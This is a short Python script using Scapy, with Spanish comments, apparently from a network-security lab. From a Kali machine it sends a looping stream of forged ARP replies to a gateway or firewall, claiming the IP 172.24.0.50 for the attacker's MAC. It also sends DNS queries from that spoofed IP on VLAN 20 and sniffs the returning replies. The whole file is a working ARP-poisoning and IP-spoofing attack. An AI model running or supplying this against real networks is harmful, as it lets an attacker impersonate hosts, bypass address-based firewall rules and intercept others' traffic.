#!/bin/python3
from scapy.all import *
import threading

eth_hdr = Ether() #Creamos el encabezado Ethernet o capa 2
eth_hdr.src = '42:9c:62:4c:a4:4c' #Asignar la MAC de origen (Kali) que envia los paquetes
eth_hdr.dst = 'ea:61:9e:e4:76:b7' #Asignar la MAC de destino que recibe los paquetes (GW o FW)

dot1q_hdr = Dot1Q() #Creamos el encabezado 802.1q (VLAN)
dot1q_hdr.vlan = 20 #Asignamos la VLAN desde donde se van a enviar los paquetes

ip_hdr = IP()			#Creamos el encabezado IP
ip_hdr.src = '172.24.0.50'	#Asignamos IP de origen (quien envia las peticiones DNS)
ip_hdr.dst = '8.8.8.8'		#Asignamos IP de destino (quien recibe las peticiones DNS)

udp_hdr = UDP()			#Creamos el encabezado UDP
udp_hdr.sport = 53990		#Asignamos el puerto de origen (quien envia las peticiones DNS)
udp_hdr.dport = 53		#Asignamos el puerto destino del servidor DNS

#Definimos el encabezado DNS a partir de uno ya capturado por wireshark
dns_req = Raw()
dns_req.load = "\x00\x3f\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d\x00\x00\x01\x00\x01"

def ARP_reply():
	arp_hdr = ARP()				#Creamos el encabezxado ARP
	arp_hdr.psrc = '172.24.0.50'		#Asignamos la IP de origen ()
	arp_hdr.pdst = '172.24.0.1'		#Asignamos la IP de destino
	arp_hdr.hwsrc = '42:9c:62:4c:a4:4c'	#Asignamos la MAC de origen (esta es la que almacena el FW)
	arp_hdr.hwdst = 'ea:61:9e:e4:76:b7'	#Asignamos la MAC de destino (el que necesita saber la MAC)
	arp_hdr.op = 2				# ARP de tipo respuesta "is-at"

	sendp(eth_hdr/dot1q_hdr/arp_hdr, loop=True, inter=0.5, verbose=False) #Envio de las tramas ARP

def sniffer():
	sniff(filter='udp port 53 and ip host 172.24.0.50', iface='eth0', prn=lambda pkt: print([pkt]))

def main():
	arp_thread = threading.Thread(target=ARP_reply)
	arp_thread.start()

	sniff_thread = threading.Thread(target=sniffer)
	sniff_thread.start()

	srploop(eth_hdr/dot1q_hdr/ip_hdr/udp_hdr/dns_req, count=5, verbose=False) #Envio de las solicitudes DNS 

if __name__ == '__main__':
	main()
